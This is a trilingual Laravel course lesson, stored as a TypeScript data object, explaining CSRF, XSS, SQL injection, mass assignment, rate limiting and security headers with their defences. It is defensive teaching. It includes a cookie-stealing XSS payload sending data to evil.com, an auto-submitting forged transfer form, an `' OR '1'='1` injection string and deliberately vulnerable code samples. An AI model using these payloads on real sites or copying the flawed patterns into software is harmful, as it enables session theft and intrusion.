import type { RoadmapDayDetail } from "@/lib/challenge-data";

export const LARAVEL_DAY_17_DETAIL: RoadmapDayDetail = {
  overview: [
    {
      en: "Security is not a feature you bolt on at the end — it is built into every layer from day one.\n\nThink of a bank:\n• <b>ID check at the door</b> — authentication (Breeze, Sanctum from Day 11)\n• <b>Cameras watching every aisle</b> — logging and auditing\n• <b>Time locks on safe-deposit boxes</b> — rate limiting (throttle middleware)\n• <b>Bulletproof glass at tills</b> — input validation (Day 5)\n• <b>Serial numbers on every form</b> — CSRF tokens\n\nLaravel has <b>built-in defences for every one of these layers</b>. Today we learn how each attack works in plain English, and how to stop it.",
      np: "Security = layered defence। Laravel मा CSRF, XSS, SQL injection, mass assignment, rate limiting सबैको built-in protection।",
      jp: "セキュリティは後付けではなく全層に組み込む。CSRF・XSS・SQLi・マスアサイン・レート制限を解説。",
    },
    {
      en: "The 5 attack types we cover today — in plain English:\n\n• <b>CSRF</b> — an attacker tricks your logged-in user's browser into silently making a request your app thinks is legitimate\n  ↳ Defence: unique hidden token in every form that only your server knows\n• <b>XSS</b> — an attacker injects JavaScript into your page that runs in other users' browsers\n  ↳ Defence: always escape output; Blade's `{{ }}` does this automatically\n• <b>SQL injection</b> — an attacker sends data that escapes your query and runs their own SQL\n  ↳ Defence: Eloquent and Query Builder use PDO prepared statements everywhere\n• <b>Mass assignment</b> — an attacker submits extra fields (like `is_admin=true`) your app saves without checking\n  ↳ Defence: `$fillable` whitelist on every model\n• <b>Brute force / rate limiting</b> — an attacker tries thousands of passwords per second\n  ↳ Defence: `throttle` middleware capping requests per time window",
      np: "CSRF, XSS, SQL injection, mass assignment, rate limiting — हरेकको attack र defence।",
      jp: "CSRF・XSS・SQLi・マスアサイン・レート制限の攻撃手法と Laravel の防御策。",
    },
  ],
  sections: [
    {
      title: {
        en: "CSRF — Cross-Site Request Forgery",
        np: "CSRF",
        jp: "CSRF（クロスサイトリクエストフォージェリ）",
      },
      blocks: [
        {
          type: "paragraph",
          text: {
            en: "<b>How CSRF works:</b>\n\nImagine you are logged in to your bank at `mybank.com`. Your browser holds a session cookie. You then visit `evil-site.com`, which has this hidden form:\n\n`<form action=\"https://mybank.com/transfer\" method=\"POST\"><input name=\"to\" value=\"attacker\"><input name=\"amount\" value=\"9999\"></form>`\n\nWhen the page loads, a script auto-submits the form. Your browser <b>automatically sends the session cookie</b> with the POST — the bank sees a valid session and processes the transfer.\n\n<b>Laravel's defence:</b> Every form gets a unique secret token (`_token`) generated per session. The malicious site cannot read this token (same-origin policy), so its fake request is rejected.\n\n↳ Blade's `@csrf` directive injects the hidden `_token` field automatically.",
            np: "CSRF = attacker ले user को browser बाट silently POST गराउँछ। Defence: session-specific `_token`।",
            jp: "CSRF は攻撃者が他サイトから被害者のブラウザで POST させる攻撃。`@csrf` で防御。",
          },
        },
        {
          type: "code",
          title: {
            en: "Blade @csrf + excluding webhook routes",
            np: "@csrf directive र webhook exclusion",
            jp: "@csrf と Webhook 除外",
          },
          code: `{{-- resources/views/posts/create.blade.php --}}
<form method="POST" action="/posts">
    @csrf   {{-- injects <input type="hidden" name="_token" value="..."> --}}

    <input type="text" name="title">
    <button type="submit">Create Post</button>
</form>

// Excluding routes that receive external webhooks
// app/Http/Middleware/VerifyCsrfToken.php
protected $except = [
    'stripe/webhook',
    'github/webhook',
    // Add external webhook routes here ONLY
];

// API routes (routes/api.php) do NOT have CSRF middleware by default.
// They use Sanctum token auth instead — tokens prove identity better than cookies.`,
        },
        {
          type: "paragraph",
          text: {
            en: "<b>When is it safe to exclude a route from CSRF?</b>\n\nOnly exclude routes that receive requests from <b>external systems that cannot hold a session</b>:\n• Payment gateway webhooks (Stripe, PayPal)\n• Version control webhooks (GitHub, GitLab)\n• Third-party service callbacks\n\n<b>Never exclude:</b>\n• Login, register, password reset\n• Any user-facing form\n• Any route that modifies user data\n\n↳ Do NOT remove `VerifyCsrfToken` from your middleware stack entirely — that disables protection for all web routes. Use `$except` for surgical exclusions only.",
            np: "CSRF exclude: external webhooks मात्र। Login/register/forms कहिल्यै exclude नगर्नुहोस्।",
            jp: "CSRF 除外は外部 Webhook のみ。ログイン・フォームは絶対に除外しない。",
          },
        },
      ],
    },
    {
      title: {
        en: "XSS — Cross-Site Scripting",
        np: "XSS",
        jp: "XSS（クロスサイトスクリプティング）",
      },
      blocks: [
        {
          type: "paragraph",
          text: {
            en: "<b>How XSS works:</b>\n\nAn attacker stores this in a blog comment: `<script>document.location='https://evil.com?c='+document.cookie</script>`\n\nIf your app renders that comment as raw HTML, <b>every visitor's browser runs the script</b> — their session cookies are stolen and sent to the attacker.\n\nXSS can:\n• Steal session cookies and hijack accounts\n• Redirect users to phishing pages\n• Inject keyloggers to capture passwords\n• Deface your site for all visitors\n\n<b>Laravel's defence:</b> Blade's `{{ }}` syntax <b>auto-escapes HTML entities</b> — `<script>` becomes `&lt;script&gt;` which the browser displays as text, not code.\n\n↳ The only dangerous syntax is `{!! !!}` which renders raw, unescaped HTML.",
            np: "XSS = attacker ले JS inject गर्छ — cookies चोर्न, redirect गर्न। Defence: `{{ }}` auto-escape।",
            jp: "XSS は悪意ある JS を注入する攻撃。Blade `{{ }}` が HTML を自動エスケープして防御。",
          },
        },
        {
          type: "code",
          title: {
            en: "Safe vs dangerous Blade output + HTMLPurifier",
            np: "Safe `{{ }}` vs dangerous `{!! !!}`",
            jp: "安全な出力と危険な出力",
          },
          code: `{{-- SAFE — Blade escapes HTML entities automatically --}}
{{ $user->bio }}
{{-- If bio = "<script>alert('xss')</script>" --}}
{{-- Rendered as: &lt;script&gt;alert('xss')&lt;/script&gt; --}}

{{-- DANGEROUS — renders raw HTML without escaping --}}
{!! $user->bio !!}
{{-- If bio = "<script>alert('xss')</script>" --}}
{{-- Browser EXECUTES the script --}}

{{-- SAFE — strip all HTML tags before display --}}
{{ strip_tags($user->bio) }}

{{-- SAFE — for rich text editors: use HTMLPurifier to allow SAFE HTML --}}
{{-- composer require ezyang/htmlpurifier --}}
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$safeHtml = $purifier->purify($request->input('body'));

// Only use {!! !!} for content YOU generate — never for user input
{!! $markdown->toHtml($post->body) !!} // OK: markdown renderer output`,
        },
        {
          type: "paragraph",
          text: {
            en: "<b>The rule is simple:</b>\n\n• Always use `{{ }}` — it is safe by default\n• Never use `{!! !!}` for user-generated content without running it through HTMLPurifier first\n\n<b>Legitimate uses for `{!! !!}`:</b>\n• A Markdown renderer you control (input comes from your database, not users directly)\n• Generated SVG or chart HTML\n• Localised content from a trusted CMS your team manages\n\n<b>Content Security Policy (CSP)</b> adds a second layer:\n• A CSP header tells the browser to only execute scripts from your own domain\n• Even if an attacker injects `<script src=\"evil.com/xss.js\">`, the browser blocks it\n  ↳ We cover CSP headers in Section 5",
            np: "`{{ }}` = always safe। `{!! !!}` = user content मा HTMLPurifier पछि मात्र।",
            jp: "`{{ }}` は常に安全。`{!! !!}` はユーザー入力に直接使わない。CSP ヘッダーで多重防御。",
          },
        },
      ],
    },
    {
      title: {
        en: "SQL injection & mass assignment protection",
        np: "SQL injection र mass assignment",
        jp: "SQL インジェクションとマスアサイン",
      },
      blocks: [
        {
          type: "paragraph",
          text: {
            en: "<b>SQL injection in plain English:</b>\n\nImagine a login form. You type your email: `admin@site.com` and the app builds: `SELECT * FROM users WHERE email = 'admin@site.com'`\n\nAn attacker types: `' OR '1'='1` — the app builds: `SELECT * FROM users WHERE email = '' OR '1'='1'` — this always returns ALL users. The attacker is logged in as the first user (often an admin).\n\n<b>Why Eloquent is safe by default:</b> Eloquent and the Query Builder use <b>PDO prepared statements</b>. User input is passed as a parameter (a `?` placeholder), never concatenated into the SQL string. The database treats it as data, never as code.\n\n<b>Mass assignment in plain English:</b> If you `User::create($request->all())`, whatever fields the user submits get saved — including `is_admin`, `role`, or `balance`. An attacker can submit any column name.",
            np: "SQL injection: string concatenation खतरनाक। Eloquent PDO prepared statements प्रयोग गर्छ — safe। Mass assignment: `$fillable` define गर्नुहोस्।",
            jp: "Eloquent は PDO 準備文でSQLi を防ぐ。マスアサインは `$fillable` ホワイトリストで守る。",
          },
        },
        {
          type: "code",
          title: {
            en: "Safe vs unsafe queries + mass assignment protection",
            np: "Safe queries र mass assignment",
            jp: "安全なクエリとマスアサイン防御",
          },
          code: `// ❌ DANGEROUS — string interpolation, SQL injection possible
$email = $request->input('email');
DB::statement("SELECT * FROM users WHERE email = '$email'");

// ✅ SAFE — PDO prepared statement, user input is bound as data
User::where('email', $email)->first();

// ✅ SAFE — manual binding (use when raw SQL is truly necessary)
DB::select('SELECT * FROM users WHERE email = ?', [$email]);
DB::select('SELECT * FROM users WHERE email = :email', ['email' => $email]);

// ── Mass assignment ─────────────────────────────────────────────

// ❌ DANGEROUS — saves every field the user submits, including is_admin
User::create($request->all());

// ✅ SAFE — only allow the fields we explicitly permit
User::create($request->only(['name', 'email', 'password']));

// ✅ SAFE — $fillable whitelist on the model
class User extends Model
{
    // Only these columns can be mass-assigned
    protected $fillable = ['name', 'email', 'password'];

    // ❌ NEVER do this in production — disables all mass assignment protection
    // protected $guarded = [];
}`,
        },
        {
          type: "paragraph",
          text: {
            en: "<b>Mass assignment rules:</b>\n\n• `$fillable` is a <b>whitelist</b> — only named columns can be set via `create()` or `fill()`\n• `$guarded` is a <b>blacklist</b> — columns listed here are blocked, everything else is allowed\n• `$guarded = []` means <b>no protection at all</b> — never use in production\n\n<b>The safe default:</b> define `$fillable` on every model that accepts user input. Be explicit about what users are allowed to set.\n\n↳ Validation (Day 5) catches <b>invalid values</b>. Mass assignment protection catches <b>extra fields</b> you never intended users to control. Both are necessary.",
            np: "`$fillable` = whitelist (safe)। `$guarded = []` = no protection (खतरनाक)।",
            jp: "`$fillable` はホワイトリスト。`$guarded = []` は全解除で危険。本番では必ず `$fillable` を定義。",
          },
        },
      ],
    },
    {
      title: {
        en: "Rate limiting & brute-force protection",
        np: "Rate limiting",
        jp: "レート制限とブルートフォース対策",
      },
      blocks: [
        {
          type: "paragraph",
          text: {
            en: "<b>Why rate limiting matters:</b>\n\nWithout it:\n• A bot can try 86,400 different passwords per second on your login form\n• A competitor can scrape your entire product catalogue in seconds\n• A DDoS attack can hammer a single endpoint and crash your server\n\nRate limiting <b>caps how many requests</b> a user (or IP) can make in a time window. Exceed the limit → `429 Too Many Requests`.\n\n<b>Two levels in Laravel:</b>\n• <b>Built-in `throttle` middleware</b> — quick to add, good for most cases\n• <b>`RateLimiter` facade</b> — custom logic (per-user, per-IP, per-subscription tier)",
            np: "Rate limiting: bot attacks, scraping, DDoS रोक्न। `throttle` middleware वा `RateLimiter` facade।",
            jp: "レート制限はボット攻撃・スクレイピング・DDoS を防ぐ。`throttle` や `RateLimiter` を使う。",
          },
        },
        {
          type: "code",
          title: {
            en: "throttle middleware + custom RateLimiter",
            np: "throttle र custom RateLimiter",
            jp: "throttle ミドルウェアとカスタム RateLimiter",
          },
          code: `// routes/web.php — simple throttle: 5 attempts per 1 minute
Route::post('/login', [LoginController::class, 'store'])
    ->middleware('throttle:5,1');

// routes/api.php — 60 requests per minute for API
Route::middleware(['auth:sanctum', 'throttle:api'])->group(function () {
    Route::apiResource('posts', PostController::class);
});

// Define named rate limiters in AppServiceProvider::boot()
use Illuminate\\Support\\Facades\\RateLimiter;
use Illuminate\\Cache\\RateLimiting\\Limit;

RateLimiter::for('api', function (Request $request) {
    return Limit::perMinute(60)
                ->by($request->user()?->id ?: $request->ip());
});

// Tiered limiting — more requests for premium users
RateLimiter::for('uploads', function (Request $request) {
    return $request->user()->isPremium()
        ? Limit::perHour(500)->by($request->user()->id)
        : Limit::perHour(50)->by($request->user()->id);
});

// When the limit is hit, Laravel automatically returns:
// HTTP 429 Too Many Requests
// Headers: Retry-After: 60, X-RateLimit-Remaining: 0`,
        },
        {
          type: "paragraph",
          text: {
            en: "<b>What happens when the limit is hit:</b>\n\nLaravel returns `429 Too Many Requests` automatically. The response includes:\n• `Retry-After: 60` — how many seconds until the limit resets\n• `X-RateLimit-Limit: 5` — the maximum allowed requests\n• `X-RateLimit-Remaining: 0` — remaining requests in the window\n\n<b>Recommended limits for common endpoints:</b>\n• Login / register: `throttle:5,1` (5 per minute — aggressive brute-force protection)\n• Password reset: `throttle:3,1` (3 per minute)\n• General API: `throttle:60,1` (60 per minute per user)\n• Public search: `throttle:30,1` (30 per minute per IP)\n\n↳ For advanced protection, use a dedicated package like `laravel-security` or put a WAF (Cloudflare, AWS WAF) in front of your app.",
            np: "429 response मा `Retry-After` header। Login: 5/min, API: 60/min, Search: 30/min।",
            jp: "制限超過で 429。`Retry-After` ヘッダーで再試行タイミングを通知。エンドポイント別に設定推奨。",
          },
        },
      ],
    },
    {
      title: {
        en: "Security headers & Content Security Policy",
        np: "Security headers",
        jp: "セキュリティヘッダーとCSP",
      },
      blocks: [
        {
          type: "paragraph",
          text: {
            en: "<b>Security headers</b> are HTTP response headers that tell the browser how to behave — like safety rules posted on the wall.\n\nWithout them, browsers allow by default:\n• Your page to be embedded in iframes on other sites (<b>clickjacking</b>)\n• Mixed HTTP/HTTPS content (downgrades TLS protection)\n• Scripts loaded from any domain (XSS amplified)\n• Browser sniffing your content type (MIME sniffing attacks)\n\nAdding security headers <b>costs you nothing</b> (a single middleware) and prevents entire categories of attack that would otherwise require complex code fixes.",
            np: "Security headers = browser लाई safety rules। Clickjacking, MIME sniffing, mixed content रोक्छ।",
            jp: "セキュリティヘッダーはブラウザへの安全規則。クリックジャッキング・MIME スニッフィングを防ぐ。",
          },
        },
        {
          type: "code",
          title: {
            en: "SecurityHeaders middleware — create and register",
            np: "SecurityHeaders middleware",
            jp: "セキュリティヘッダーミドルウェア",
          },
          code: `<?php
// app/Http/Middleware/SecurityHeaders.php
namespace App\\Http\\Middleware;

use Closure;
use Illuminate\\Http\\Request;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next): mixed
    {
        $response = $next($request);

        $response->headers->set('X-Frame-Options', 'SAMEORIGIN');
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy', 'geolocation=(), camera=(), microphone=()');
        $response->headers->set(
            'Content-Security-Policy',
            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
        );

        return $response;
    }
}

// Register globally in bootstrap/app.php (Laravel 11)
->withMiddleware(function (Middleware $middleware) {
    $middleware->append(SecurityHeaders::class);
})`,
        },
        {
          type: "table",
          caption: {
            en: "Key security headers — what they do and the recommended value",
            np: "Security headers cheat-sheet",
            jp: "セキュリティヘッダー一覧",
          },
          headers: [
            { en: "Header", np: "Header", jp: "ヘッダー" },
            { en: "What it prevents", np: "के रोक्छ", jp: "防ぐ攻撃" },
            { en: "Recommended value", np: "सिफारिस value", jp: "推奨値" },
          ],
          rows: [
            [
              { en: "X-Frame-Options", np: "X-Frame-Options", jp: "X-Frame-Options" },
              { en: "Clickjacking — embedding your site in a hidden iframe", np: "Clickjacking", jp: "クリックジャッキング" },
              { en: "`SAMEORIGIN`", np: "`SAMEORIGIN`", jp: "`SAMEORIGIN`" },
            ],
            [
              { en: "X-Content-Type-Options", np: "X-Content-Type-Options", jp: "X-Content-Type-Options" },
              { en: "MIME sniffing — browser guessing content type and running scripts", np: "MIME sniffing", jp: "MIME スニッフィング" },
              { en: "`nosniff`", np: "`nosniff`", jp: "`nosniff`" },
            ],
            [
              { en: "Content-Security-Policy", np: "CSP", jp: "CSP" },
              { en: "XSS via inline scripts or external script sources", np: "XSS", jp: "XSS（スクリプト注入）" },
              { en: "`default-src 'self'`", np: "`default-src 'self'`", jp: "`default-src 'self'`" },
            ],
            [
              { en: "Strict-Transport-Security", np: "HSTS", jp: "HSTS" },
              { en: "HTTP downgrade attacks — forcing HTTPS", np: "HTTP downgrade", jp: "HTTP ダウングレード攻撃" },
              { en: "`max-age=31536000; includeSubDomains`", np: "max-age=31536000", jp: "max-age=31536000" },
            ],
            [
              { en: "Referrer-Policy", np: "Referrer-Policy", jp: "Referrer-Policy" },
              { en: "Information leakage in the Referer header to third parties", np: "Referer leakage", jp: "リファラ情報漏洩" },
              { en: "`strict-origin-when-cross-origin`", np: "strict-origin-when-cross-origin", jp: "strict-origin-when-cross-origin" },
            ],
          ],
        },
      ],
    },
  ],
  faq: [
    {
      question: {
        en: "Does CSRF protection work with Sanctum SPA cookie mode?",
        np: "Sanctum SPA cookie mode मा CSRF काम गर्छ?",
        jp: "Sanctum の SPA クッキーモードで CSRF は機能しますか？",
      },
      answer: {
        en: "Yes — Sanctum SPA cookie mode uses CSRF protection differently from form-based apps.\n\n<b>How it works:</b>\n1. The SPA calls `GET /sanctum/csrf-cookie` once — this sets the `XSRF-TOKEN` cookie\n2. For every mutating request (POST, PUT, DELETE), the SPA sends the cookie value as an `X-XSRF-TOKEN` header\n3. Sanctum verifies the header matches the cookie — an attacker's site cannot read your cookie, so it cannot forge the header\n\nAxios sends the `X-XSRF-TOKEN` header automatically when it finds the `XSRF-TOKEN` cookie — no manual setup needed.\n\n<b>Token mode (Authorization: Bearer):</b> CSRF is irrelevant. Bearer tokens must be explicitly attached to requests — they are never sent automatically by the browser, so CSRF cannot exploit them.",
        np: "SPA mode: `GET /sanctum/csrf-cookie` → `XSRF-TOKEN` cookie → `X-XSRF-TOKEN` header। Bearer token mode मा CSRF irrelevant।",
        jp: "SPA は `/sanctum/csrf-cookie` で XSRF-TOKEN を取得し X-XSRF-TOKEN ヘッダーで送信。Bearer トークンモードは CSRF 不要。",
      },
    },
    {
      question: {
        en: "How do I prevent timing attacks on password comparisons?",
        np: "Timing attacks रोक्ने तरिका?",
        jp: "パスワード比較のタイミング攻撃を防ぐには？",
      },
      answer: {
        en: "Never compare passwords or tokens with `===` or `==`.\n\nA <b>timing attack</b> exploits the fact that `==` returns `false` as soon as it finds a mismatched character — shorter mismatches take less time to compute. By measuring response time thousands of times, an attacker can determine password length and individual characters.\n\n<b>Use `Hash::check()`</b> for passwords — it uses `hash_equals()` internally, which takes the <b>same amount of time regardless of where the strings differ</b>.\n\n`Hash::check('userInput', $storedHash)` — always safe\n\nFor API tokens or HMAC signatures, use `hash_equals($expected, $actual)` directly.\n\n↳ The time difference is nanoseconds — invisible to humans, but measurable by an automated attacker making millions of requests.",
        np: "`Hash::check()` प्रयोग गर्नुहोस् — `hash_equals()` internally। `===` timing attack को लागि vulnerable छ।",
        jp: "パスワード比較は必ず `Hash::check()`。内部で `hash_equals()` を使い比較時間を一定に保つ。",
      },
    },
    {
      question: {
        en: "Should I sanitize input on save, or escape output on render?",
        np: "Input sanitize गर्ने कि output escape?",
        jp: "入力をサニタイズすべきですか、出力をエスケープすべきですか？",
      },
      answer: {
        en: "<b>Both — they are complementary, not alternatives.</b>\n\n• <b>Validate on input</b> (Day 5): reject or normalise data that does not match the expected format — wrong email format, string where an integer is expected\n• <b>Sanitize on input</b>: strip or encode characters that should not be stored — e.g. `strip_tags()` on plain-text fields\n• <b>Escape on output</b>: always use `{{ }}` in Blade, even for data you believe is already clean\n\n<b>Why both?</b> Data flows through many paths:\n• Stored via the web form (validated)\n• Imported via a CSV upload (not validated)\n• Seeded by a developer (not sanitized)\n• Fetched from a third-party API (unknown format)\n\nEscaping at output is the last line of defence that catches everything.",
        np: "Input validation + sanitize on save + escape on output — तिनीहरू complementary हुन्।",
        jp: "入力バリデーション・保存時サニタイズ・出力エスケープは補完関係。どれか一つでは不十分。",
      },
    },
    {
      question: {
        en: "What is CORS and how does it relate to security?",
        np: "CORS र security को सम्बन्ध?",
        jp: "CORS とセキュリティの関係は？",
      },
      answer: {
        en: "<b>CORS (Cross-Origin Resource Sharing)</b> controls which domains can make JavaScript-initiated requests to your API from a browser.\n\n<b>Important nuance:</b> CORS is a <b>browser-level control</b>, not a server-level security measure:\n• A browser respects CORS headers and blocks unauthorised cross-origin requests\n• `curl`, Postman, and server-to-server calls <b>ignore CORS entirely</b>\n• CORS does NOT prevent unauthenticated access — it only restricts which origins browsers allow\n\n<b>Configure CORS in `config/cors.php`:</b>\n• `allowed_origins: ['https://yourapp.com']` — restrict to your frontend domain\n• `allowed_origins: ['*']` — allows ANY domain (never use for authenticated APIs)\n• `supports_credentials: true` — required for Sanctum SPA cookie mode\n\n↳ For authenticated APIs: always set specific origins, never `*`.",
        np: "CORS = browser-level control। curl/Postman ले ignore गर्छ। `config/cors.php` मा specific origins set गर्नुहोस्।",
        jp: "CORS はブラウザレベルの制御。curl や Postman は無視する。`config/cors.php` で許可ドメインを限定する。",
      },
    },
    {
      question: {
        en: "How do I audit my Laravel app for security issues?",
        np: "Security audit कसरी गर्ने?",
        jp: "Laravel アプリのセキュリティ監査方法は？",
      },
      answer: {
        en: "<b>Three levels of security auditing:</b>\n\n<b>1. Built-in tools (free):</b>\n• `composer audit` — checks all your dependencies against the PHP Security Advisory Database for known CVEs\n• Laravel Telescope — inspect every request, query, exception, and mail in development\n• `php artisan route:list` — review which routes are public vs protected\n\n<b>2. Automated scanning (free tier available):</b>\n• Enlightn — scans your codebase for security misconfigurations (CORS, CSRF, debug mode in production, exposed .env)\n• Run: `composer require enlightn/enlightn --dev` then `php artisan enlightn`\n\n<b>3. Ongoing hygiene:</b>\n• Keep Laravel and all packages updated: `composer update`\n• Never commit `.env` to version control\n• Set `APP_DEBUG=false` and `APP_ENV=production` in production\n• Use `config:cache` and `route:cache` — they fail loudly if misconfigured\n\n↳ Run `composer audit` as part of your CI pipeline so new CVEs are caught before deployment.",
        np: "`composer audit`, Telescope, Enlightn, `APP_DEBUG=false` production मा।",
        jp: "`composer audit`・Telescope・Enlightn で監査。本番は `APP_DEBUG=false`、`.env` はコミットしない。",
      },
    },
  ],
};
